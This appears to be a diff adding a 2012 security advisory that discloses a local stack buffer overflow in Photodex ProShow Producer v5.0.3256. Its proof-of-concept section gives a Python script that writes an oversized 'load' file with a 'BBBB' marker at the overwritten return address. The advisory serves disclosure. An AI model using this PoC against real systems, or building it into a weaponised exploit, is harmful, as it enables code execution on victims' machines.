@@ -1,0 +1,83 @@
+Inshell Security Advisory
+http://www.inshell.net/
+
+
+1. ADVISORY INFORMATION
+-----------------------
+Product:        Photodex ProShow Producer
+Vendor URL:     www.photodex.com
+Type:           Stack-based Buffer Overflow [CWE-121]
+Date found:     2012-06-06
+Date published: 2012-07-02
+CVSSv2 Score:   6,9 (AV:L/AC:M/Au:N/C:C/I:C/A:C)
+CVE:            -
+
+
+2. CREDITS
+----------
+This vulnerability was discovered and researched by Julien Ahrens from
+Inshell Security.
+
+
+3. VERSIONS AFFECTED
+--------------------
+Photodex ProShow Producer v5.0.3256, older versions may be affected too.
+
+
+4. VULNERABILITY DESCRIPTION
+----------------------------
+A Local Buffer Overflow Vulnerability has been found on the Photodex
+ProShow Producer v5.0.3256.
+
+When starting, the application loads the contents of the "load" file
+from its application directory. The application does not validate the
+length of the string loaded from the "load" file before passing it to a
+buffer, which leads to a Buffer Overflow.
+
+An attacker needs to force the victim to place an arbitrary "load" file
+into the application directory.
+
+
+5. PROOF-OF-CONCEPT (CODE / Exploit)
+------------------------------------
+#!/usr/bin/python
+file="load"
+
+junk1="\x41" * 9848
+boom="\x42\x42\x42\x42"
+junk2="\x43" * 100
+
+poc=junk1 + boom + junk2
+
+try:
+    print "[*] Creating exploit file...\n";
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!";
+except:
+    print "[!] Error while creating file!";
+
+
+For further Screenshots and/or PoCs visit:
+http://security.inshell.net/advisory/30
+
+
+6. SOLUTION
+-----------
+None
+
+
+7. REPORT TIMELINE
+------------------
+2012-06-06: Initial notification sent to vendor
+2012-06-12: No response, second notification sent to vendor
+2012-06-20: No response, third notification sent to vendor
+2012-06-20: Vendor response, sent to appropriate departments
+2012-07-02: No further contact by vendor
+2012-07-02: Full Disclosure
+
+
+8. REFERENCES
+-------------
+http://security.inshell.net/advisory/30
